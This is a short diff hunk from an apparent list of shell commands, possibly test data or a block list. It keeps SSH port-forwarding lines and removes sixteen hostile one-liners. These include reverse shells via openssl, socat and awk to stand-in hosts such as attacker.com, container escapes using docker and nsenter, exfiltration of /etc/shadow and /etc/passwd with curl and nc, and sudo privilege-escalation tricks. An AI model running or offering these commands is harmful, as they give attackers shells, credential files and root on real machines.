@@ -1658,19 +1658,3 @@ ssh -R 4444:127.0.0.1:4444 dev@tester.com
 ssh -L 8080:127.0.0.1:80 dev@tester.com
 ssh -R 4444:localhost:4444 dev@tester.com
 ssh -L 8080:localhost:80 dev@tester.com
-mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect c2.com:4444 > /tmp/s; rm /tmp/s
-openssl s_client -quiet -connect attacker.com:4444 | /bin/bash
-socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:attacker.com:4444
-socat tcp-connect:10.10.10.10:4444 exec:"/bin/bash",pty,stderr
-docker run -v /:/host -it alpine chroot /host /bin/bash
-docker run -v /:/host -it ubuntu chroot /host /bin/sh
-nsenter -t 1 -m -u -i -n -p -- /bin/bash
-nsenter -t 1 -m -u -i -n -p -- /bin/sh
-tar -czf - /etc/shadow | base64 | curl -d @- https://attacker.com/leak
-cat /etc/shadow | curl -X POST -d @- http://attacker.com/exfil
-cat /etc/passwd | nc -w 3 attacker.com 9999
-awk 'BEGIN {s = "/inet/tcp/0/attacker/4444"; while(42) { do{ printf "$ " |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'
-sudo find . -exec /bin/sh \; -quit
-sudo vim -c ':!/bin/sh'
-sudo env /bin/sh
-sudo cp /bin/sh /tmp/suid_sh && sudo chmod +s /tmp/suid_sh
